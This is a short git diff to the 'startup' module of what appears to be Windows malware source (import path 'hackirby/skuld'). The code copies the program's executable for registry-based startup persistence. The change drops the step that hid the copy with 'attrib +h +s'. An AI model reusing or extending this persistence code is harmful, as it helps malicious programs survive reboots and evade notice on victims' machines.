@@ -2,8 +2,6 @@ package startup
 
 import (
 	"os"
-	"os/exec"
-
 	"golang.org/x/sys/windows/registry"
 
 	"github.com/hackirby/skuld/utils/fileutil"
@@ -40,9 +38,5 @@ func Run() error {
 	}
 
 	err = fileutil.CopyFile(exe, path)
-	if err != nil {
-		return err
-	}
-
-	return exec.Command("attrib", "+h", "+s", path).Run()
+	return err
 }
